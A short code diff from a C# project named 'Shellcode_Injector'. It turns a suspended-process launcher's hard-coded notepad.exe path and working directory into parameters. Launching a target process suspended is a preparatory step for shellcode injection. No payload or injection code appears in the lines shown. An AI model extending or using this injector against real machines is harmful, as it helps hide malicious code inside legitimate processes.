@@ -20,7 +20,7 @@ namespace Shellcode_Injector
         }
 
         //Create proc and return the process information struct
-        public static WinApi.PIN StartS()
+        public static WinApi.PIN StartS(string cmd = "C:\\Windows\\System32\\notepad.exe", string cwd = "C:\\Windows\\System32")
         {
             //Init structs for create process
             var sin = new WinApi.SIN();
@@ -34,14 +34,14 @@ namespace Shellcode_Injector
 
             //Create process
             bool ok = WinApi.Starter(
-                    "C:\\Windows\\System32\\notepad.exe",
+                    cmd,
                     null,
                     ref pattr,
                     ref tattr,
                     false,
                     (uint)WinApi.proc.sspnd,
                     IntPtr.Zero,
-                    "C:\\Windows\\System32",
+                    cwd,
                     ref sin,
                     out pin
                 );
